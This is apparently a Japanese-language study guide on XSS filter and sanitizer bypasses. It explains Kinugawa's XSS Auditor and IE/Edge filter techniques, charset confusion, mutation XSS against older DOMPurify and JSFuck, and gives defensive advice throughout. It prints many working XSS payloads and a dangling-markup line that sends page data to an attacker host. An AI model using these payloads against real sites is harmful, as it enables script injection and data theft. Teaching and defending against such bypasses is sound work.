なぜ強力か: これは XSS Auditor 特有の話に見えて、実は**現代でも通用する普遍的発想**です。`{{constructor.constructor('alert(1)')()}}` は AngularJS のテンプレート式で、`constructor.constructor` を辿ると `Function` コンストラクタに到達し、そこから任意コードを生成・実行できます（AngularJS テンプレートインジェクション）。DOM Clobbering（DOMクロバリング＝`name`/`id` 属性で JavaScript から参照される変数を HTML 要素で「上書き」する技法。`<input name=ownerDocument>` が `node.ownerDocument` の参照を狂わせる）も同様に、フィルタではなくアプリ側 JS の前提を崩します。「同一オリジンにある正規の部品を武器に変える」——この発想は WAF・CSP 回避の章でも繰り返し現れます。

#### 文字コード（charset）を悪用する回避——回避の最深部

Kinugawa 資料の白眉は、**文字エンコーディング（charset）の混乱**を突く一連の手法です。原理はこうです。**フィルタはある文字コード（多くは UTF-8）を前提にバイト列を文字として解釈してパターン照合するのに対し、ブラウザが最終的にそのページをレンダリングするときの文字コードが別物だと、「同じバイト列が両者で違う文字列に見える」**。この不一致を作れば、フィルタには無害に、ブラウザには `<script>` に見せられます。

```html
<!-- ISO-2022-JP のエスケープシーケンスで反応文字列を分断 -->
<meta charset=iso-2022-jp>
<svg o[0x1B](Bnload=alert(1)>
```

なぜ動くか: `[0x1B](B`（ESC + `(B`）は ISO-2022-JP（日本語の文字コード）における「ここから ASCII に戻る」というエスケープシーケンスで、**表示上は消える（何も描かれない）バイト列**です。よってフィルタが見るバイト列には `o<ESC>(Bnload` という異物が挟まって `onload` と一致しないのに、ブラウザが ISO-2022-JP として解釈するとエスケープシーケンスが除去され `onload` が復活し、`<svg onload>` が発火します。charset が明示されていないページで有効でした。

IE/Edge XSS Filter に対しても同種の charset 回避が並びます。

```html
<!-- ナビゲーション時のエンコード不一致 -->
<meta charset=utf-8>
<script>
document.charset="x-chinese-cns";
location="https://vulnerabledoma.in/bypass/text?q=<script/旡alert(1)<\/script/旡"
</script>
```

なぜ動くか: `document.charset` を `x-chinese-cns`（中国語の文字コード）に変えてから遷移すると、URL 中の文字 `旡` は送信バイト列では `0xA13E` になります。フィルタは文字 `旡` として照合しますが、遷移先で `x-chinese-cns` として解釈すると別の文字境界で切れて `<script>` が現れます。**フィルタの解釈環境と実行環境の charset がズレる**という、charset 回避の核心を最も鮮明に示す例です。

```
+/v8-+ADw-script+AD4-alert(1)+ADw-/script+AD4-
```

なぜ動くか: `+/v8-` は UTF-7 の BOM（Byte Order Mark＝文書の文字コードを示す先頭マーカー）として認識され、ページ全体が UTF-7 として再解釈されます。UTF-7 では `+ADw-` が `<`、`+AD4-` が `>` を表すので、`+ADw-script+AD4-` は `<script>` になります。フィルタが UTF-8 前提で「`<script>` は無い」と判断した後、ブラウザが UTF-7 に切り替えて `<script>` を出現させる、という時間差攻撃です（charset 未指定のページが前提）。

その他の IE/Edge 系回避:

```html
<!-- HZ-GB-2312 のエスケープで属性を分断 -->
<x~
onfocus=alert(1) id=a tabindex=0>#a

<!-- XML 名前空間の偽装（Edge） -->
<embed/:script allowscriptaccess=always src=//l0.cm/xss.swf>

<!-- @ を文字参照化して CSS import を通す -->
<svg><style>&commat;import'//attacker'</style></svg>
```

なぜ動くか: `~` は HZ-GB-2312 における改行エスケープとして働き、`onfocus` を属性値から分断してフィルタの照合を外します。`<embed/:script>` は `/:script` が「script タグらしさ」でフィルタを惑わせつつ、実体は embed として解釈される名前空間の混乱を突きます。`&commat;` は `@` の文字参照で、CSS の `@import`（外部スタイル読み込み）をフィルタに気づかせずに成立させ、外部リソースを読み込ませます（IE10 モードでは `behavior:url()` によるスクリプト実行にも繋がりました）。

**Referer を使った無効化**も収録されています。IE/Edge の XSS Filter は同一サイト内リンク経由でアクセスされた（＝`Referer` が同一サイトの）場合にフィルタを無効化する挙動があり、これを悪用します。

```html
<a href="https://vulnerabledoma.in/bypass/text?q=<script>alert(1)</script>">Click HERE</a>
```

Edge には `Referer` を偽装できるバグ（`window.open` と `opener` を操作するもの）もあり、2018年4月時点で修正が確認されています。

> 出典: Fixed Bypass Archive（Wiki） — https://github.com/masatokinugawa/filterbypass/wiki/Fixed-Bypass-Archive

#### charset 回避が今も重要な理由

XSS Auditor は消えましたが、**charset 混乱そのものは今も生きた攻撃面**です。`Content-Type` ヘッダで `charset` を明示していないページ、`<meta charset>` が本文より後ろにあるページ、ユーザー入力を含むレスポンスの文字コードが動的に変わるページでは、UTF-7 や ISO-2022-JP の再解釈による XSS が今も成立し得ます。防御は明快で、**すべてのレスポンスで `Content-Type: text/html; charset=utf-8` を明示し、`X-Content-Type-Options: nosniff` を付けてブラウザの charset 推測（sniffing）を止める**ことです。Kinugawa 資料の charset 章は、この防御がなぜ必要かを攻撃側から裏付ける最良の教材です。

---

### 発展: フィルタの次の戦場——mutation XSS（mXSS）とサニタイザ回避

ブラウザ組み込みフィルタが消えた今、防御の主役は **サニタイザライブラリ**（DOMPurify などの、危険な HTML を除去して安全な HTML を返すライブラリ）に移りました。そして攻撃側の主戦場も、フィルタ回避から**サニタイザ回避**へ移りました。その最先端が **mutation XSS（mXSS＝変異型 XSS）** で、これは Kinugawa 氏が世界的に有名になった研究領域です。PayloadsAllTheThings も mXSS の項で Kinugawa 氏の Google 検索に対する事例を収録しています。

#### mXSS とは——「サニタイズ後に安全でなくなる」現象

mXSS の原理は、**「サニタイザが検査・整形した HTML 文字列が、ブラウザの DOM に挿入されて再パースされる過程で、勝手に別の（危険な）DOM に『変異』する」** ことにあります。多くのサニタイザは「HTML をパース → 危険な要素・属性を除去 → 安全な HTML 文字列に再シリアライズ（DOM を文字列に書き戻す）」という流れで動きます。ところが、この**再シリアライズした文字列を最終的に `innerHTML` などに入れると、ブラウザが再びパースし直す**。このとき「サニタイザがパースした結果」と「ブラウザが再パースした結果」がズレると、除去したはずの実行可能コードが復活してしまう。これが mXSS です。要点は **「サニタイザのパーサと、最終挿入先のブラウザパーサの、解釈の差」** を突く点にあり、charset 回避で見た「二つの解釈環境のズレ」とまったく同じ発想です。

PayloadsAllTheThings が挙げる、Kinugawa 氏による Google 検索への mXSS（DOMPurify に対して機能した）:

```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

なぜ変異するか: `<noscript>` 要素の中身は、「JavaScript が有効なブラウザ」と「無効なブラウザ」でパース規則が変わる特殊な要素です。JS 有効時、`<noscript>` の中身は生テキスト的に扱われ、`<p title="</noscript>...` の `</noscript>` は「属性値の一部の文字列」と見なされます。ところがサニタイズを経て再度 DOM に挿入されると、パースの文脈が変わって `</noscript>` が本物の閉じタグとして解釈され、その後ろの `<img src=x onerror=alert(1)>` が**属性値の中から解放されて生きた要素になる**。つまり「サニタイザには無害な属性値に見え、ブラウザ再パースで実行要素に変異する」——これが mXSS の典型です。

> 出典: PayloadsAllTheThings — XSS Injection README（Mutation XSS の項） — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md

#### namespace confusion による DOMPurify < 2.0.17 バイパス

（以下は、担当資料からリンクされる詳細記事〔securitum の解説等〕が執筆環境のネットワーク制限で直接取得できなかったため、Web 検索結果のスニペットと一般的な知識に基づく補足解説です。バージョン等の細部は必ず一次情報で確認してください。）

mXSS の中でも特に重要なのが **namespace confusion（名前空間の混乱）** を使った DOMPurify のバイパスです。これは Michał Bentkowski 氏が公開した **「DOMPurify < 2.0.17 バイパス」**（2020年、修正版は DOMPurify 2.0.17）として知られ、Kinugawa 氏の一連の mXSS 研究とも密接に関連します。

背景となる仕組み: HTML には **三つの名前空間（namespace）** が混在します——通常の HTML、SVG、MathML です。`<svg>` や `<math>` の内側は「foreign content（外来コンテンツ）」と呼ばれ、**通常の HTML とはパース規則が変わります**。さらにその中に `<foreignObject>`（SVG 内）や `<mtext>` / `<mi>`（MathML 内。これらは「integration point＝統合点」と呼ばれ、内部で HTML 名前空間へ戻る）などがあると、**パーサはその境界で名前空間を切り替える**。この「どこで名前空間が切り替わるか」の判断が、サニタイザのパースとブラウザの再パースでズレると、除去されたはずのタグが復活します。

代表的なペイロードの形（`<mglyph>` や `<mtext>` と `<style>` を組み合わせるもの）:

```html
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
```

なぜ変異するか（概略）: `<mglyph>` や `<malignmark>` は MathML の中で特殊な扱いを受ける要素で、`<mtext>`（MathML のテキスト統合点）の中に置かれると名前空間の解釈が切り替わります。サニタイザは、ある名前空間の文脈で `<style>` の中身を「ただのスタイル文字列（無害なテキスト）」として扱い、その中の `<img onerror>` を実行可能な要素とは認識せず素通しします。ところがサニタイズ済み文字列を DOM に挿入して再パースすると、名前空間の切り替わり方が変わり、`<style>` がもはやその中身を生テキストとして保持しなくなって、内部の `<img src onerror=alert(1)>` が**本物の要素として起き上がり発火する**。「サニタイザが想定した名前空間」と「ブラウザ再パース時の名前空間」の食い違いが、除去したはずのコードを蘇らせる——これが namespace confusion による mXSS の核心です。

> 出典（検索スニペットによる二次確認）: Mutation XSS via namespace confusion – DOMPurify < 2.0.17 bypass（Michał Bentkowski, securitum）／PortSwigger Research "Bypassing DOMPurify again with mutation XSS" — 検索: https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss

#### バージョン依存の攻撃という視点（陳腐化への注意）

ここで強調したいのは、**サニタイザ回避は「バージョン依存の攻撃」だ**という点です。上記の namespace confusion バイパスは **DOMPurify < 2.0.17（2020年に 2.0.17 で修正）** に対するものであり、最新版では通用しません。しかし DOMPurify はその後も新たな mXSS（例えば Kinugawa 氏や他の研究者が発見した、より深いネストを使う変異や、`<template>`・`<xmp>`・エンティティ処理を突くもの）で複数回バイパスされ、そのたびに修正を重ねてきました。

学習者への実践的教訓は三つです。

1. **サニタイザは「使えば安全」ではなく「最新に保てば相対的に安全」**。防御側は DOMPurify 等を必ず最新版に追従させる。攻撃・診断側は対象が使っているライブラリと**そのバージョン**を特定し、そのバージョンで既知のバイパスがないかを調べる。
2. **バイパス手法には必ず「対象バージョン」と「修正年・修正版」がある**。本節の各ペイロード（Chrome 59〜65 で順次修正された XSS Auditor 回避群、2020年の DOMPurify 2.0.17 バイパス等）は、その大半が**すでに修正済み**です。丸暗記して現行環境に投げても動きません。価値があるのは**「なぜ動いたか」の原理**で、それは新しいバイパスを自分で発見する土台になります。
3. **mXSS の根本原因は「サニタイズと最終挿入で HTML が二度パースされ、その解釈が食い違う」こと**。よって最も堅牢な防御は、そもそも文字列 HTML を組み立てて挿入しない設計——`textContent` を使う、`Trusted Types`（信頼できる型以外を sink に入れさせないブラウザ機構）を導入する、サニタイズ結果を `innerHTML` ではなく安全な API 経由で挿入する——です（詳細は防御の章に譲ります）。

---

### この節のまとめ

- **PayloadsAllTheThings** は「文脈で引く辞書」。入力が落ちる文脈（タグ内／属性値内／JS 文字列内／URL）をまず特定し、その欄のペイロードを選ぶ。`<script>` が無理なら `onerror`/`onload`、それも無理ならエンコーディング回避、文脈不明ならポリグロット、という手順を体で覚える。ペイロードには常に「なぜ動くか」（パーサの状態、文字参照の復元、スキーム判定の緩さ）が対応する。
- **Kinugawa filterbypass** は「フィルタ回避の原理集」。対象の XSS Auditor / IE・Edge XSS Filter は既に廃止済みだが、そこで確立された **charset 混乱・パーサ状態遷移・同一オリジンリソース悪用・名前空間の混乱** という発想は、現代の WAF 回避・サニタイザ回避・mXSS にそのまま生きる。
- 両資料に共通する統一原理は **「フィルタ／サニタイザが見る文字列と、ブラウザが最終的に解釈する文字列を、意図的にズラす」** こと。文字コード、パース文脈、名前空間——どのレイヤーでズレを作っても XSS は成立し得る。
- したがって防御は「危険な文字列を弾く（ブロックリスト）」では原理的に穴が残る。**出力時の文脈別エンコーディング、charset の明示（+ `nosniff`）、サニタイザの最新化、`Trusted Types`／CSP による許可リスト型の多層防御**——これらの組み合わせだけが持続的に有効である。

---

## 難読化・短縮JavaScript（Kinugawa / はせがわ）

反射型の素朴なXSS（Cross-Site Scripting: 攻撃者が仕込んだ文字列が、ブラウザによって「データ」ではなく「コード」として解釈・実行されてしまう脆弱性）を理解した読者が次に直面するのが、「危険な文字や単語を検出して弾く仕組み（フィルタ）を、攻撃者はどうやってすり抜けるのか」という問題です。前セクション（フィルタ回避）では「そもそもブラックリスト方式は原理的に破綻している」という上位の原理を扱いました。本セクションは、その敗北を**具体的な技術として実証する**3つの資料を精読・統合します。

- **資料1 — 樹下雅章（Masato Kinugawa）「XSSフィルターの使い方」（Shibuya.XSS techtalk #9）**: ブラウザに内蔵されていた反射型XSS遮断機能（XSS Auditor / XSSフィルター）そのものを題材に、「どう回避するか」だけでなく「その防御機能を逆に攻撃の道具として使う」という発想を扱った資料。
- **資料2 — 樹下雅章「5文字で書くJavaScript」（Shibuya.XSS techtalk #10）**: 任意のJavaScriptを、ごく少数の文字種だけで書く「短縮JavaScript」の理論。JSFuck（6文字）の仕組みと、それを5文字へ削る樹下氏の研究を扱う。
- **資料3 — はせがわようすけ（Yosuke Hasegawa）「難読化JavaScript」**: 記号だけでJavaScriptを書くjjencode／aaencode（いずれもはせがわ氏の作）を筆頭に、難読化（コードを人間に読めない形へ変形すること）の原理と、防御側から見た意味を扱う。

この3つは一本の線でつながっています。**「危険なパターンを列挙して弾く」という防御は、攻撃側が“同じ処理を無数の別表記で書ける”限り必ず破れる**——難読化・短縮JavaScriptは、その事実の最も純粋な実証です。本セクションの価値は個々のペイロード（攻撃を成立させる実際の入力文字列）の丸暗記ではなく、**なぜブラウザやJavaScriptエンジンが、そんな壊れた・奇妙な入力まで実行してしまうのか**という仕組みのレベルの理解にあります。

---

### 0. 本セクションの資料取得状況（重要な但し書き）

本セクションが対象とする3つのURLは、いずれも自動取得の際にネットワーク側のエグレス制限（外部サイトへの直接アクセスを制限する仕組み）によって直接取得できませんでした（speakerdeck.com / docswell.com が丸ごとブロック）。ただし、以下の**一次・準一次ソース**を用いて実質的な内容を復元しています。

- 資料1（XSSフィルターの使い方）については、樹下氏本人がGitHub上で公開・保守している姉妹資料 **「Browser's XSS Filter Bypass Cheat Sheet」**（`github.com/masatokinugawa/filterbypass` のWiki）を全文取得しました。これは同発表とCODE BLUE 2015「XSS Attacks Exploiting XSS Filter」の内容を体系化した、実質的な一次ソースです。
- 資料2（5文字で書くJavaScript）については、JSFuck公式リポジトリ（`github.com/aemkei/jsfuck`）のREADMEとマッピング定義（`jsfuck.js`）を全文取得し、そこに樹下氏のパイプライン演算子による5文字化の情報（Xchars.js／esdiscuss／Wikipedia）を突き合わせました。
- 資料3（難読化JavaScript）については、はせがわ氏作のjjencode／aaencodeの原理をJSFuckの原理と対照し、複数の解説・実装から復元しました。

各トピックの冒頭には、ユーザー指示に従い「未取得の資料」ブロックを明示し、そのうえで復元内容を記述します。厳密な原文（スライドの図・言い回し）は各URLからご確認ください。

---

### 1. 前提：短縮・難読化はなぜXSSの「武器」になるのか

XSSの現場で開発者が仕掛ける関門は、おおむね次の3種類です。

1. **アプリ側のフィルタ／ブラックリスト**: `<script>`、`alert`、`javascript:`、`on〇〇=` のような「危険そうな文字列」を検出して削除・拒否する。
2. **WAF（Web Application Firewall: Webアプリの前段でリクエストを検査し、攻撃パターンを遮断する装置）**: 正規表現ベースでペイロードを検出する。
3. **CSP（Content Security Policy: ページが読み込み・実行してよいスクリプトの出所をブラウザに宣言するヘッダ）** や、かつてのブラウザ内蔵 **XSSフィルター**。

短縮・難読化JavaScriptは、この1〜3のうち主に1と2、そして状況によっては3をも突破するための技術です。要点は次の一言に尽きます。

> **同じ `alert(1)` を、`alert` という文字を一切使わずに、記号だけで、あるいは5〜6種類の文字だけで書けるなら、「`alert` を弾く」「英数字を弾く」といったフィルタは意味をなさない。**

以下では、(A) 防御機能そのものを回避・悪用する技術（資料1）、(B) 文字種を極限まで削る短縮技術（資料2）、(C) 記号だけで書く難読化技術（資料3）の順に見ていきます。

---

### 2. XSSフィルターの「使い方」— 防御機能を回避し、逆用する（資料1 / Kinugawa）

> ⚠️ **未取得の資料**: 「XSSフィルターの使い方 / Shibuya.XSS techtalk #9（Masato Kinugawa）」は自動取得できませんでした（理由: speakerdeck.com がネットワークのエグレス制限で全面ブロックされているため）。以下のURLからユーザーご自身で直接ご覧ください: https://speakerdeck.com/masatokinugawa/shibuya-dot-xss-techtalk-number-9
>
> （以下は、樹下氏本人が公開する姉妹一次資料「Browser's XSS Filter Bypass Cheat Sheet」およびCODE BLUE 2015発表の内容に基づく解説です。）

#### 2.1 そもそもXSSフィルター（XSS Auditor）とは何か、どう動くのか

**XSSフィルター**とは、かつてブラウザに内蔵されていた「反射型XSSをブラウザ側で検出・遮断する機能」です。Chrome/Safari系では **XSS Auditor**、Internet Explorer / 旧Edgeでは **XSS Filter** と呼ばれました（`X-XSS-Protection` ヘッダで制御）。

仕組みの核心はこうです。

1. ブラウザはページを受信すると、**そのページを開くために送ったリクエスト（URLのクエリ文字列やPOSTボディ）の中身**と、**返ってきたレスポンスHTMLの中身**を突き合わせる。
2. 「リクエストに含まれていた文字列」が「レスポンスHTMLの中でスクリプトとして働く形（例: `<script>...</script>` や `onerror=...`）」でそのまま出現していたら、「これは反射型XSSだ」とみなす。
3. 該当箇所を無害化（スクリプトを実行させない）してからページを描画する。

つまりXSS Auditorは、**「送った入力が、実行可能なコードとして反射されている」というパターンマッチ**で動いています。ここが弱点の源泉です。攻撃者が「フィルタが見る文字列」と「ブラウザが最終的に組み立てるDOM（Document Object Model: HTMLを解析して作る要素のツリー構造）」を食い違わせられれば、遮断は空振りします。これは前セクションのInvictiの主張（「フィルタが見る文字列とブラウザが作るツリーは別物」）の、ブラウザ内蔵フィルタ版です。

#### 2.2 発表のもう一つの主眼：フィルターを「攻撃の道具」に転用する

このシリーズ（Shibuya.XSS #9 と CODE BLUE 2015「XSS Attacks Exploiting XSS Filter」）が衝撃的だったのは、単なる回避集ではなく、**防御機能であるはずのXSSフィルターを、攻撃者が能動的に悪用できる**と示した点です。核心的なアイデアは次の2つです。

- **正規のスクリプトを狙って無効化する（Induced XSS / スクリプトの選択的殺害）**: XSSフィルターは「リクエスト中の文字列と一致する部分」を無効化します。攻撃者は、**攻撃したいページに元から存在する“正規のインラインスクリプト”の断片**をURLパラメータにわざと含めて送りつけられます。するとフィルターは「これはXSSだ」と誤認し、**本来ページを守っていた正規スクリプトの方を無効化**してしまいます。これにより、たとえば次のような防御を破壊できます。
  - ページが `<script>` でCSPを動的に設定していたり、フレーム破り（framebusting: 自分が `<iframe>` 内に埋め込まれていたら抜け出すコード）を行っていたりする場合、その防御スクリプトを狙撃して無力化する。
  - 結果として、そのままでは成立しなかったクリックジャッキングや別のXSSが成立するようになる。
- **CSPのバイパスに転用する**: 後述の「同一オリジンのリソースの利用」で、CSPが `default-src 'self'` のように同一オリジンのみ許可している状況でも、同一オリジン上のFlashやライブラリを踏み台にスクリプト実行へ持ち込める（フィルターの遮断挙動と組み合わせる）。

この「防御を攻撃に転用する」視点が、後にブラウザベンダがXSS Auditor / XSSフィルターを**廃止する**判断（詳細は2.6）に直結しました。防御として不完全なだけでなく、有害でもあったのです。

#### 2.3 そもそも「遮断対象でない」文脈 — 保護が最初から存在しない穴

XSS Auditorには、構造的に**最初から保護しない**文脈が多数あります。ここでは特別な細工なしにスクリプトが実行できます。診断者にとっては「フィルタがあっても攻撃可能」を示す重要な材料です。

**(a) 文字列リテラル内で起こるXSS**（入力がJSの文字列 `"..."` の中に入るタイプ）:

```html
<script>var q="";alert(1)//"</script>
```
> なぜ動くか: 入力 `";alert(1)//` が既存のJS文字列を閉じ、続けて新しい文（`alert(1)`）を書き、`//` で残りをコメント化している。Auditorはこの「文字列リテラルからの脱出」型を（現在は）遮断対象にしていない。

**(b) URL単独で成立するXSS**（入力が `<a href>` などにそのまま入る）:

```html
<a href="javascript:alert(1)">Link</a>
```
> なぜ動くか: `javascript:` スキーム（URLの代わりにJavaScriptを実行する疑似プロトコル）は、リンクのクリックで発火する。Auditorはこの単独ケースを遮断しない。

**(c) 注入ポイントが2つ以上あるケース**: 1つの入力値がページ内の2か所に反映される場合、片方で開いて片方で閉じる形にでき、Auditorはこれを取りこぼす（Chromiumでも過去にWontFix扱い）。

```html
<div>`-alert(1)</script><script>`</div>
<div>`-alert(1)</script><script>`</div>
```

**(d) 文字列の削除・置換が挟まる場合**: サーバ側が入力の一部を削除・置換すると、フィルタが見る文字列と最終出力がズレて遮断が外れる。

```html
削除される例:
<svg o<script>nload=alert(1)>   →（<script>が削除され）→   <svg onload=alert(1)>

置換される例:
<script>/&/-alert(1)</script>   →（&が&amp;に置換され）→   <script>/&amp;/-alert(1)</script>
```
> なぜ動くか: Auditorは「送信された生の文字列」で判定するが、実際にDOM化されるのは「削除・置換後の文字列」。両者が異なるため、遮断条件にマッチしない。

**(e) `document.write()` 以外のDOM based XSS**: `innerHTML` や `location.href` への代入で起きるDOM XSS（入力がサーバを経由せずJSだけで危険なsink（sink: ユーザー入力が最終的に実行・解釈される危険な代入先。例: `innerHTML`）に渡る）は、そもそもリクエストとレスポンスの突き合わせで捕まえられない。

```html
<script>
  hash=location.hash.slice(1);
  document.body.innerHTML=decodeURIComponent(hash);  // #<img src=x onerror=alert(1)>
</script>
```
> なぜ動くか: ペイロードはURLのハッシュ（`#` 以降。サーバへ送信されない部分）に置ける。サーバのレスポンスにはペイロードが現れないため、反射の検出が原理的に不可能。

**(f) XMLページ／Content Sniffingでの実行**:

```xml
<?xml version="1.0"?><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script>
```
> なぜ動くか: XHTMLの名前空間（`xmlns`）を宣言したXMLとして解釈されると、`<script>` がスクリプトとして実行される。`Content-Type` が正しくなくContent Sniffing（ブラウザが中身を見てMIMEタイプを推測する挙動）でXMLが選ばれた場合にも起こる。

このほか、実行までは至らなくても攻撃に使える「許容される記述」として、`http(s):` リンクの偽装（フィッシング文言のリンク挿入）、片側だけ閉じない引用符で秘密情報を外部送信する `<img src="https://attacker/?data=`、任意CSSの注入（`@import` や `<link rel=stylesheet>` による情報窃取）などが挙げられています。

#### 2.4 代表的なバイパス技法（遮断が働く場面をすり抜ける）

以下は、Auditor / XSSフィルターが本来遮断するはずの状況を、仕組みの隙を突いて回避する技法群です。これらの多くは「**同一オリジンにある正規のリソースを踏み台にする**」「**文字コードの解釈差を突く**」という2大原理に集約されます。

**(1) 同一オリジンのリソース（ライブラリ）を踏み台にする**

XSS Auditorは「**クエリを持たない同一オリジンのリソースのロード**」を遮断しません。同一オリジン上にテンプレートエンジンやライブラリがあると、それを間接的に起動して任意コード実行に持ち込めます。原理の中心は **`constructor.constructor`** です（後述の難読化とも共通する超重要ガジェット）。

```html
Angularの例:
<script src="/js/angular1.6.4.min.js"></script><p ng-app>{{constructor.constructor('alert(1)')()}}
```
> なぜ動くか: Angularは `ng-app` 属性を持つ要素内の `{{ }}`（テンプレート式）を評価する。式 `constructor.constructor('alert(1)')()` は、ある値の `constructor`（＝そのクラス。例: `Object`）→ さらにその `constructor`（＝ `Function` コンストラクタ）とたどり、`Function('alert(1)')()` を作って実行する。つまり `<script>` も `alert(` も「フィルタが探す形」では現れないのに、任意のJSが動く。この `constructor.constructor` によるサンドボックス脱出は、テンプレートインジェクション（CSTI）全般で最重要のイディオム。

同様に **Vue.js**（`{{constructor.constructor('alert(1)')()}}`）、**jQuery**（`ownerDocument` という名前の入力でDOM Clobbering（DOM Clobbering: HTML要素のname/id属性でJSのプロパティ参照を上書き・誤誘導する手法）を起こし、追加系関数 `after/append/html` 等でスクリプトブロックを注入）、**underscore.js**（`<% %>` テンプレート）、**JSXTransformer / babel-standalone**（SVG内のスクリプトブロックのコメント `<!-- -->` を誤ってコードとして評価）を踏み台にする例が示されています。

```html
jQueryの例（ownerDocumentクロバリング + コメントのみスクリプトの遮断漏れ）:
<form class=child><input name=ownerDocument><script><!--alert(1)</script></form>
```
> なぜ動くか: `<input name=ownerDocument>` により `form.ownerDocument` の参照先を誤認させ、本来スクリプトを実行しない場面でjQueryが要素を挿入・実行してしまう。さらにjQueryはスクリプトブロック先頭の `<!--` を除去する処理を持ち、Auditorは「コメントしか含まないスクリプトブロック」を遮断しないため、両者が噛み合ってバイパスが成立する。

**(2) ファイルアップロード／同一オリジンのユーザーコンテンツ**

同一オリジンに攻撃者が `.js` ファイルをアップロードできれば、`<script src=/uploads/xss.js></script>` はクエリなし同一オリジンなので遮断されません。

**(3) 文字コード（エンコーディング）の解釈差を突く**

Auditorは特定の文字コードの解釈をブラウザ本体と別に行うため、両者の食い違いを突けます。

```html
ISO-2022-JPのエスケープシーケンス挿入:
<meta charset=iso-2022-jp><svg o[0x1B](Bnload=alert(1)>
```
> なぜ動くか: ISO-2022-JPでは `[0x1B](B`（ESC + `(B`）等のバイト列は「ASCIIへ戻す」制御シーケンスで、表示上は無視される。これを `onload` の途中に挟むと、Auditorは `o…nload` を連続した属性名と認識できず遮断に失敗するが、ブラウザは制御列を捨てて `onload` として解釈・実行する。

IE/Edge側では、**HZ-GB-2312** のエスケープシーケンス、**UTF-7のBOM**（`+/v8` 等をページ先頭に置くとページ全体がUTF-7とみなされ、`+ADw-script+AD4-` が `<script>` になる）、そして **ナビゲーション時のエンコード不一致**（`x-chinese-cns` 等の文字コードで、フィルタが見る文字列と実際に送信されるバイト列を食い違わせる）といった、文字コード起因のバイパスが多数示されています。

**(4) 正規表現の「置換で幅を超える」バイパス（IE/Edge）**

IE/EdgeのXSSフィルターは `<sc{r}ipt.*?>` のような正規表現で遮断し、`.*?` に相当する部分（ワイルドカード）の許容幅が有限でした。置換によってその幅を超える文字列に膨らませると、遮断条件にマッチしなくなります。

```html
<script/&>alert(1)</script>   →（&が二重に置換され）→   <script/&amp;amp;>alert(1)</script>
```
> なぜ動くか: フィルタが許容するワイルドカード幅（この例では最大8文字）を、置換後の `/&amp;amp;`（10文字）が超えるため、`<script ...>` を検出できなくなる。パターンマッチ方式の「有限の遮蔽幅」という実装制約を突いた例。

**(5) その他**: 複数のnullバイト（`[0x00]`×多数 + `<script>`）、`<script>` 内の `-->` によるコメント、半端な `<base>` タグでスクリプトの読み込み先を攻撃者ドメインへ差し替える、Flash（`allowscriptaccess=always` の `<embed>`／`flashvars`／`ExternalInterface.objectID`）、IEのAdobe Acrobat ReaderプラグインでPOST由来XSSを再送する、IE/EdgeでRefererを同一ドメインに偽装するとフィルタが働かない、など多数。

#### 2.5 修正済みバイパスに見る「バージョン依存」の実例

このチートシートは、修正済みの回避を別ページ（Fixed Bypass Archive）に保存しており、**攻撃可否がブラウザのバージョンに強く依存する**ことがよく分かります。例:

- SVGの `<animate>` の `values` 属性による `javascript:` 実行 → **Chrome 59 / 62** で段階的に修正。
- 半端な `</script` 閉じタグの利用 → **Chrome 61** で修正。
- 複数nullバイト、`<script>` 内 `-->` コメント → **Chrome 62** で修正。
- `<object><param name=url>` によるFlash実行 → **Chrome 64** で修正。
- リンク＋半端な `<base href="javascript:\` → **Chrome 65** で修正。
- Edgeのリファラ偽装バグ → **2018年4月**時点で修正確認。

> これは教訓的です。「あるバージョンで塞がれた ≠ 恒久的に安全」。逆に「載っていない ≠ 攻撃不可能」でもありません。バージョンに紐づく攻撃は陳腐化するため、常に対象環境のバージョンを明記して評価する必要があります。

#### 2.6 結論：XSSフィルターは「廃止」された — 根本対策こそが答え

XSS Auditor / XSSフィルターは、(a) 保護しない文脈が広大で、(b) 回避が容易で、(c) しかも「正規スクリプトの選択的無効化」という**新たな攻撃面を生む**ものでした。この結論を受け、**GoogleはChrome 78（2019年）でXSS Auditorを完全に削除**し、`X-XSS-Protection` は非推奨となりました。MicrosoftもEdgeをChromiumベースへ移行する中でXSSフィルターを廃止しています。

チートシート自身が明言するとおり、**バイパスできるかどうかにかかわらず、必ず根本的なXSS対策（文脈に応じた出力エンコード、危険なsinkの回避、そしてCSP）を行うべき**です。ブラウザ内蔵フィルタに頼る時代は終わりました。

> 出典: Browser's XSS Filter Bypass Cheat Sheet（Masato Kinugawa） — https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet
> 出典: XSSフィルターの使い方 / Shibuya.XSS techtalk #9（Masato Kinugawa） — https://speakerdeck.com/masatokinugawa/shibuya-dot-xss-techtalk-number-9
> 出典: XSS Attacks Exploiting XSS Filter（Masato Kinugawa, CODE BLUE 2015） — https://www.slideshare.net/slideshow/xss-attacks-exploiting-xss-filter-by-masato-kinugawa-code-blue-2015/59712698

---

### 3. 5文字で書くJavaScript — 文字種を極限まで削る（資料2 / Kinugawa）

> ⚠️ **未取得の資料**: 「5文字で書くJavaScript / Shibuya.XSS techtalk #10（Masato Kinugawa）」は自動取得できませんでした（理由: speakerdeck.com がネットワークのエグレス制限で全面ブロックされているため）。以下のURLからユーザーご自身で直接ご覧ください: https://speakerdeck.com/masatokinugawa/shibuya-dot-xss-techtalk-number-10
>
> （以下は、JSFuck公式リポジトリ `github.com/aemkei/jsfuck` のREADME・マッピング定義、および樹下氏のパイプライン演算子による5文字化に関する情報を統合した解説です。）

#### 3.1 動機：なぜ「少ない文字種」で書けると強いのか

XSSの現場では、「英字が使えない」「記号の一部しか通らない」「`(` `)` が禁止」といった**文字種の制限**にしばしば直面します（フィルタ、WAF、あるいは出力文脈の制約）。ならば逆に、「**任意のJavaScriptを、ごく少数の文字種だけで表現できる**」ことを示せれば、そうした制限の多くは無意味になります。この「表現の下限はどこか（＝最小の文字アルファベットは何文字か）」を追い求めるのが、短縮JavaScriptの世界です。

#### 3.2 JSFuck — 6文字 `[]()!+` だけで任意のJSを書く

**JSFuck**（Martin Kleppe / @aemkei、2012年）は、`[` `]` `(` `)` `!` `+` の**わずか6文字**だけで任意のJavaScriptを記述・実行する手法です。仕組みは「JavaScriptの型変換の緩さ」を段階的に積み上げるもので、次のように構築されます。

**(1) 真偽値をつくる（`!` と `[]`）**

```js
![]    // false （空配列は真値なので、否定するとfalse）
